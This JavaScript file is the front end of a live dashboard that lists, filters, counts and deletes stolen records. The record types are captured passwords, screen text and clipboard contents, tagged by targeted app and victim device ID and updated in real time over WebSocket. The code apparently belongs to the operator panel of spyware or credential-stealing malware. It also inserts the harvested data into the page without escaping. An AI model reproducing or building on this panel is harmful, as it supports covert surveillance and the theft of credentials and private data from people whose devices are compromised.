// Connect to WebSocket
const socket = io();

let allData = [];
let currentFilter = { app: '', type: '', search: '' };

// DOM elements
const tableBody = document.getElementById('table-body');
const totalCount = document.getElementById('total-count');
const todayCount = document.getElementById('today-count');
const passwordCount = document.getElementById('password-count');
const screenCount = document.getElementById('screen-count');
const clipboardCount = document.getElementById('clipboard-count');
const appBreakdown = document.getElementById('app-breakdown');
const lastUpdate = document.getElementById('last-update');
const statusBadge = document.getElementById('status-badge');

// --- WebSocket Events ---
socket.on('connect', () => {
    statusBadge.textContent = '● Live';
    statusBadge.className = 'badge online';
    fetchData();
});

socket.on('disconnect', () => {
    statusBadge.textContent = '● Disconnected';
    statusBadge.className = 'badge offline';
});

socket.on('newData', (newRows) => {
    console.log('📡 New data received via WebSocket:', newRows.length, 'rows');
    // Prepend new rows to the top of the table
    allData = [...newRows, ...allData];
    renderTable(allData);
    fetchStats();
    lastUpdate.textContent = `Last update: just now (live)`;
});

// --- Fetch Data ---
async function fetchData() {
    try {
        const response = await fetch('/api/view?limit=200');
        const data = await response.json();
        allData = data;
        renderTable(data);
        fetchStats();
        lastUpdate.textContent = `Last update: ${new Date().toLocaleTimeString()}`;
    } catch (err) {
        console.error('Failed to fetch data:', err);
    }
}

// --- Fetch Stats ---
async function fetchStats() {
    try {
        const response = await fetch('/api/stats');
        const stats = await response.json();
        totalCount.textContent = stats.total || 0;
        todayCount.textContent = stats.today || 0;

        // Breakdown
        let pass = 0, screen = 0, clip = 0;
        if (stats.breakdown) {
            stats.breakdown.forEach(item => {
                if (item.payload_type === 'password') pass = item.count;
                else if (item.payload_type === 'screen_text') screen = item.count;
                else if (item.payload_type === 'clipboard') clip = item.count;
            });
        }
        passwordCount.textContent = pass;
        screenCount.textContent = screen;
        clipboardCount.textContent = clip;

        // Top Apps
        if (stats.topApps && stats.topApps.length > 0) {
            appBreakdown.innerHTML = stats.topApps.map(app => 
                `<span class="app-tag">${app.app_name || 'Unknown'} <span class="count">${app.count}</span></span>`
            ).join('');
        } else {
            appBreakdown.innerHTML = '<span style="color:#8b949e;">No apps targeted yet.</span>';
        }
    } catch (err) {
        console.error('Failed to fetch stats:', err);
    }
}

// --- Render Table ---
function renderTable(data) {
    let filtered = data;

    // Apply filters
    if (currentFilter.app) {
        filtered = filtered.filter(row => row.app_name === currentFilter.app);
    }
    if (currentFilter.type) {
        filtered = filtered.filter(row => row.payload_type === currentFilter.type);
    }
    if (currentFilter.search) {
        const searchLower = currentFilter.search.toLowerCase();
        filtered = filtered.filter(row => 
            row.data && row.data.toLowerCase().includes(searchLower)
        );
    }

    if (filtered.length === 0) {
        tableBody.innerHTML = '<tr><td colspan="7" style="text-align:center; color: #8b949e; padding: 40px;">No data matches your filters.</td></tr>';
        return;
    }

    tableBody.innerHTML = filtered.map(row => {
        let dataPreview = row.data;
        if (dataPreview && dataPreview.length > 60) {
            dataPreview = dataPreview.substring(0, 60) + '...';
        }
        // Highlight search term
        if (currentFilter.search && dataPreview) {
            const regex = new RegExp(`(${currentFilter.search})`, 'gi');
            dataPreview = dataPreview.replace(regex, '<span class="highlight">$1</span>');
        }

        const date = new Date(row.captured_at);
        const timeStr = date.toLocaleString();

        return `
            <tr>
                <td>${row.id}</td>
                <td><span style="background: #21262d; padding: 2px 10px; border-radius: 12px; font-size: 11px;">${row.payload_type || 'unknown'}</span></td>
                <td>${row.app_name || 'N/A'}</td>
                <td><span class="data-preview">${dataPreview || '{}'}</span></td>
                <td style="font-size: 12px; color: #8b949e;">${row.device_id ? row.device_id.substring(0, 12) + '...' : 'N/A'}</td>
                <td style="font-size: 12px; color: #8b949e;">${timeStr}</td>
                <td><button class="delete-btn" data-id="${row.id}">🗑 Delete</button></td>
            </tr>
        `;
    }).join('');

    // Attach delete event listeners
    document.querySelectorAll('.delete-btn').forEach(btn => {
        btn.addEventListener('click', async (e) => {
            const id = e.target.dataset.id;
            if (confirm(`Delete record #${id}?`)) {
                try {
                    const res = await fetch(`/api/delete/${id}`, { method: 'DELETE' });
                    if (res.ok) {
                        // Remove from local data
                        allData = allData.filter(row => row.id != id);
                        renderTable(allData);
                        fetchStats();
                    } else {
                        alert('Delete failed.');
                    }
                } catch (err) {
                    alert('Error deleting.');
                }
            }
        });
    });
}

// --- Filter Listeners ---
document.getElementById('app-filter').addEventListener('change', (e) => {
    currentFilter.app = e.target.value;
    renderTable(allData);
});

document.getElementById('type-filter').addEventListener('change', (e) => {
    currentFilter.type = e.target.value;
    renderTable(allData);
});

document.getElementById('search-input').addEventListener('input', (e) => {
    currentFilter.search = e.target.value.trim();
    renderTable(allData);
});

document.getElementById('refresh-btn').addEventListener('click', () => {
    fetchData();
});

// Auto-refresh every 15 seconds (fallback if WebSocket lags)
setInterval(() => {
    fetchStats();
}, 15000);

// Initial load
fetchData();